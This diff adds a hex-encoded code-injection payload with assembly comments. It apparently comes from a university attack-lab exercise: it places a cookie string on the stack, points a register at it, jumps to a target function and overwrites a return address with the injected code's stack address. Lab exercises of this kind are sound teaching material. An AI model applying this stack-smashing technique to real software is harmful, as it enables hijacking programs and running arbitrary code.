@@ -1,0 +1,11 @@
+68 fa 18 40 00       	/* push   $0x4018fa */
+48 83 ec 38          	/* sub    $0x38,%rsp */
+48 b8 35 39 62 39 39 	/* movabs $0x6166373939623935,%rax */
+37 66 61 
+48 89 04 24          	/* mov    %rax,(%rsp) */
+c6 44 24 08 00 	        /* movb   $0x0,0x8(%rsp) */
+48 89 e7             	/* mov    %rsp,%rdi */
+48 83 c4 38          	/* add    $0x38,%rsp */
+c3                   	/* ret */
+30 31 32 00             /* padding to 40 bytes */
+78 dc 61 55             /* injected code address */
